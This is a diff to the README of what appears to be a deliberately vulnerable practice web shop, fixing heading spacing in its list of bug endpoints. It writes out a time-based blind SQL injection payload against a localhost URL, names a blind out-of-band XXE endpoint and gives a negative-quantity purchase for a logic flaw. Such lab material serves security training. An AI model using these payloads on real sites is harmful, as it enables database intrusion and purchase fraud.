@@ -2,7 +2,7 @@
 /Vstore
 
 ## Bug API
-###1. GET "/product/findUnsafe"
+### 1. GET "/product/findUnsafe"
 - Bug: SQLi
 - Params: {name}
 - Payload:
@@ -21,7 +21,8 @@
     Type: time-based blind
     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
     Payload: http://localhost:8080/product/findUnsafe?name=' AND (SELECT 5823 FROM (SELECT(SLEEP(5)))RyfP)-- FGig
-###2. POST "/product/showBillVuln"
+    
+### 2. POST "/product/showBillVuln"
 - Bug: Blind Out-of-Band XXE
 - Params: object User in body request
 - Payload: 
@@ -42,7 +43,7 @@
 <user>
 <id_user>1</id_user></user>
 
-###3. POST "/product/buy"
+### 3. POST "/product/buy"
 - Bug: Logic
 - Params: {num, id}
 - Payload: num=-1&id=5
